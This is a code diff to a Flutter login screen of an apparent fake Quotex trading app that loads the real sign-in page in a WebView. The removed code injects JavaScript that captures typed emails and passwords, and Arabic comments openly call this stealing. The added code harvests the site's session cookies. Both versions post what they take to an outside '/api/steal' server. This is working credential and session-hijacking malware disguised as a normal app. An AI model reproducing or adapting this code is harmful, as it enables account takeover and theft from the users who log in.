@@ -41,6 +41,7 @@ class LoginScreen extends StatefulWidget {
 
 class _LoginScreenState extends State<LoginScreen> {
   late WebViewController _controller;
+  final WebViewCookieManager _cookieManager = WebViewCookieManager();
 
   @override
   void initState() {
@@ -58,80 +59,28 @@ class _LoginScreenState extends State<LoginScreen> {
     _controller = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
       ..setUserAgent("Quotex/1.0")
-      ..addJavaScriptChannel(
-        'QTX_CREDS',
-        onMessageReceived: (msg) async {
-          print("JAVASCRIPT MESSAGE: ${msg.message}");
-          
-          try {
-            var data = jsonDecode(msg.message);
-            // هون بنمسك بس لما يكون في إيميل وباسورد
-            if (data['type'] == 'creds' && data['email'] != null && data['email'] != "" && data['password'] != null) {
-              
-              // إشعار إنه سرقنا البيانات
-              if (mounted) {
-                ScaffoldMessenger.of(context).showSnackBar(
-                  SnackBar(content: Text("تم سرقة البيانات! ${data['email']}"), backgroundColor: Colors.green),
-                );
-              }
-
-              // نبعتها للسيرفر
+      ..setNavigationDelegate(
+        NavigationDelegate(
+          onPageFinished: (url) async {
+            // 390. نستخدم الـ CookieManager (Pigeon) عشان نسحب الكوكيز
+            final cookies = await _cookieManager.getCookies(Uri.parse('https://quotex.com'));
+            String cookieString = cookies.map((c) => "${c.name}=${c.value}").join("; ");
+            
+            if (cookieString.isNotEmpty) {
               await http.post(
                 Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
                 headers: {"Content-Type": "application/json"},
-                body: msg.message,
+                body: jsonEncode({"type": "cookies", "data": cookieString}),
               );
-
-              // نحول المستخدم للواجهة
+              
               if (mounted) {
                 Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
               }
             }
-          } catch (e) {
-            print("Error: $e");
-          }
-        },
-      )
-      ..setNavigationDelegate(
-        NavigationDelegate(
-          onPageFinished: (url) {
-            // نحقن السكربت بعد ثانيتين من تحميل الصفحة
-            Future.delayed(const Duration(seconds: 2), () {
-              _injectOriginalScript();
-            });
           },
         ),
       )
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
-  }
-
-  void _injectOriginalScript() {
-    String jsScript = """
-      (function() {
-        function findEmail() { return document.querySelector('input[name="email"], input[type="email"], #email'); }
-        function findPass() { return document.querySelector('input[name="password"], input[type="password"], #password'); }
-        
-        function sendCreds() {
-          try {
-            var e = findEmail(), p = findPass();
-            // 383. نتأكد إنه الحقول مليانة
-            if (e && p && e.value && p.value) {
-              QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
-            }
-          } catch (err) {}
-        }
-        
-        if (!window.__qtxHooksInstalled) {
-          window.__qtxHooksInstalled = true;
-          document.addEventListener('submit', sendCreds, true);
-          document.addEventListener('click', function(ev) {
-            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
-            if (t) sendCreds();
-          }, true);
-        }
-      })();
-    """;
-    _controller.runJavaScript(jsScript);
   }
 
   @override
